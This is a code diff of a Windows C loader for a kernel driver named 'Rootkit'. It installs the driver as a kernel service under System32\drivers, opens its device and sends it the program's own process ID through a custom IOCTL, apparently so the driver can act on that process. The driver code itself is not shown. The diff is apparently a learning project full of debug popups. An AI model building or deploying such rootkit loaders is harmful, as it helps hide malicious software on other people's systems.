@@ -5,9 +5,10 @@
 #define SERVICE "Rootkit"
 #define DNAME   "Dppr"
 #define DEVICE "\\\\.\\Rootkit"
-#define DRIVER "c:\\\\Users\\David\\Desktop\\Rootkit.sys"
+#define DRIVER "c:\\Windows\System32\drivers\DPDriver.sys"
 
 HANDLE install_driver();
+BOOL load_driver(SC_HANDLE svcHandle);
 
 //void monitor();
 
@@ -27,8 +28,16 @@ HANDLE install_driver();
 
 int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
 
-	HANDLE device = install_driver();
+	char pid[32] = { 0 };
+	sprintf_s(pid, 32, "%lu", GetCurrentProcessId());
 
+	popup(pid, pid);
+
+	HANDLE device = install_driver();
+	if (!device) {
+		popup("Shit", "HHH");
+	}
+	popup("Ho", "hi");
 	NTSTATUS status;
 	ULONG bytesReturned;
 
@@ -37,13 +46,22 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
 	(
 		device,
 		0x815,
-		NULL,
-		0,
+		pid,
+		strlen(pid) + 1,
 		&status,
 		32,
 		&bytesReturned,
 		NULL
 	);
+
+	if (!result) {
+		char b[100];
+		sprintf_s(b, "%lu", GetLastError());
+		popup(b, b);
+	}
+	else {
+		popup("Interesting", "Hmm");
+	}
 
 
 
@@ -95,21 +113,48 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
 	return 0;
 }
 
+BOOL load_driver(SC_HANDLE svcHandle) {
+
+	// Attempt to start the service
+	if (!StartService(svcHandle, 0, NULL)) {
+
+		// Check if error was due to the driver already running
+		if (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING) {
+
+			popup("Driver running", "Hm");
+			return TRUE;
+
+		}
+		else {
+			printError();
+			return FALSE;
+		}
+	}
+
+	printf("[+] Driver loaded.\n");
+	return TRUE;
+}
+
+
 HANDLE install_driver() {
 
 	SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
-	SC_HANDLE hService = OpenServiceW(hSCManager, TEXT(SERVICE), SERVICE_ALL_ACCESS);
+
+	SC_HANDLE hService = OpenService(hSCManager, TEXT(SERVICE), SERVICE_ALL_ACCESS);
 
 	HANDLE device = NULL;
+
 	
 	/* Installing service (if it doesn't exist yet..) */
 	if (!hService && GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST) {
+
+		popup("I am inside the if (line 134)", "Woow");
 
 		hService = CreateService
 		(
 			hSCManager,
 			TEXT(SERVICE),
-			TEXT(DNAME),
+			TEXT(SERVICE),
 			SC_MANAGER_ALL_ACCESS,
 			SERVICE_KERNEL_DRIVER,
 			SERVICE_DEMAND_START,
@@ -119,6 +164,15 @@ HANDLE install_driver() {
 
 		);
 
+		if (load_driver(hService)) {
+
+			popup("loaded driver", "After it didn't even exist");
+
+		}
+
+	}
+	else {
+		
 		device = CreateFile
 		(
 			TEXT(DEVICE),
@@ -130,8 +184,18 @@ HANDLE install_driver() {
 			NULL
 		);
 
-	}
+		if (device == INVALID_HANDLE_VALUE) {
+			popup("Invalid handle", "wawawa");
+		}
 
+		if (device == INVALID_HANDLE_VALUE && !load_driver(hService)) {
+			popup("Invalid handle?!", "Interesting");
+			device = NULL;
+		}
+
+		popup("Hello from", "The other side!");
+	}
+	
 
 	CloseServiceHandle(hService);
 	CloseServiceHandle(hSCManager);
